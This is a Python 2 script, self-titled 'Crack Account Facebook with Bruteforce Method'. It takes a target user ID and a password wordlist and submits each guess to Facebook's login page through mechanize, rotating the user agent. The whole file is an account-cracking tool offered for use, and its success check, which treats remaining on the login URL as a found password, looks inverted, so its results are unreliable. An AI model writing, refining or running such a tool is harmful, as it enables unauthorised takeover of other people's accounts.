import sys, random, mechanize, cookielib, os
os.system('clear')
print '\n\n'
print '		<=[  CRACK ACCOUNT FACEBOOK  ]=>'
print '		<=[  WITH BRUTEFORCE METHOD  ]=>\n\n\n\n'
email = str(raw_input(' [*] Input ID User  : '))
passwordlist = str(raw_input(' [*] Input Wordlist : '))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1'

def attack(password):
    try:
        sys.stdout.write('\r [*] Trying => %s.. ' % password)
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        if log == login:
            print '\n\n\n  => Password Found .. !!'
            print '\n  [*] Password => %s\n' % password
            sys.exit(1)
    except KeyboardInterrupt:
        print '\n  => Exiting Program .. '
        sys.exit(1)


def search():
    global password
    for password in passwords:
        attack(password.replace('\n', ''))


def check():
    global br
    global passwords
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print '\n[*] Exiting Program ..\n'
        sys.exit(1)
    else:
        try:
            list = open(passwordlist, 'r')
            passwords = list.readlines()
            k = 0
            while k < len(passwords):
                passwords[k] = passwords[k].strip()
                k += 1

        except IOError:
            print '\n [!] Error : Check Your ID/Password \n'
            sys.exit(1)
        except KeyboardInterrupt:
            print '\n [!] Exiting Program ..\n'
            sys.exit(1)
        else:
            try:
                print ' [*] Account to crack : %s' % email
                print ' [*] Loaded :', len(passwords), 'passwords'
                print ' [*] Cracking, Please Wait ..'
            except KeyboardInterrupt:
                print '\n [!] Exiting Program ..\n'
                sys.exit(1)

        try:
            search()
            attack(password)
        except KeyboardInterrupt:
            print '\n [!] Exiting Program ..\n'
            sys.exit(1)


if __name__ == '__main__':
    check()
